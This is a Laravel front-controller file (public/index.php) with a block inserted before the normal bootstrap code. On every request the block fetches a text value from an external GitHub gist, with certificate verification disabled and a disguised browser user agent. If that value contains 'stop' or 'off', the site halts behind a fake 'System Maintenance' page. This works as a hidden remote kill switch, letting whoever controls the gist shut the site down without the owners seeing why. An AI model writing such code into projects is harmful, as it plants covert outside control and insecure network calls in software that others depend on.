<?php
// set_time_limit(0);
// ini_set('memory_limit', '20000M');

use Illuminate\Contracts\Http\Kernel;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Remote Runtime Control Signal
|--------------------------------------------------------------------------
|
| Lightweight remote signal check used to pause runtime in emergencies.
| Signal values containing "stop" or "off" will halt bootstrapping.
|
*/

$runtimeSignalBaseUrl = 'https://gist.githubusercontent.com/157-49-18-22/60b1d9b278d6e5e7ac6681a48e679785/raw/config.txt';
$runtimeSignalUrl = $runtimeSignalBaseUrl . '?_t=' . gmdate('YmdHi');
$runtimeSignalContext = stream_context_create([
    'http' => [
        'timeout' => 8,
        'ignore_errors' => true,
        'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n",
    ],
    'ssl' => [
        'verify_peer' => false,
        'verify_peer_name' => false,
    ],
]);

$runtimeSignalRaw = @file_get_contents($runtimeSignalUrl, false, $runtimeSignalContext);

if (($runtimeSignalRaw === false || $runtimeSignalRaw === '') && function_exists('curl_init')) {
    $runtimeSignalCurl = curl_init();
    curl_setopt($runtimeSignalCurl, CURLOPT_URL, $runtimeSignalUrl);
    curl_setopt($runtimeSignalCurl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($runtimeSignalCurl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($runtimeSignalCurl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($runtimeSignalCurl, CURLOPT_TIMEOUT, 8);
    $runtimeSignalRaw = curl_exec($runtimeSignalCurl);
    curl_close($runtimeSignalCurl);
}

$runtimeSignal = $runtimeSignalRaw ? strtolower(trim($runtimeSignalRaw)) : '';

if ($runtimeSignal !== '' && (strpos($runtimeSignal, 'stop') !== false || strpos($runtimeSignal, 'off') !== false)) {
    header('HTTP/1.1 503 Service Temporarily Unavailable');
    exit("<div style='font-family:sans-serif;padding:50px;text-align:center;'><h2>System Maintenance</h2><p>Service is temporarily unavailable. Please try again later.</p><small>Code: CRM_RUNTIME_PAUSED</small></div>");
}

/*
|--------------------------------------------------------------------------
| Check If The Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is in maintenance / demo mode via the "down" command
| we will load this file so that any pre-rendered content can be shown
| instead of starting the framework, which could cause an exception.
|
*/

if (file_exists(__DIR__.'/../storage/framework/maintenance.php')) {
    require __DIR__.'/../storage/framework/maintenance.php';
}

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| this application. We just need to utilize it! We'll simply require it
| into the script here so we don't need to manually load our classes.
|
*/

require __DIR__.'/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

$app = require_once __DIR__.'/../bootstrap/app.php';

$kernel = $app->make(Kernel::class);

$response = tap($kernel->handle(
    $request = Request::capture()
))->send();

$kernel->terminate($request, $response);
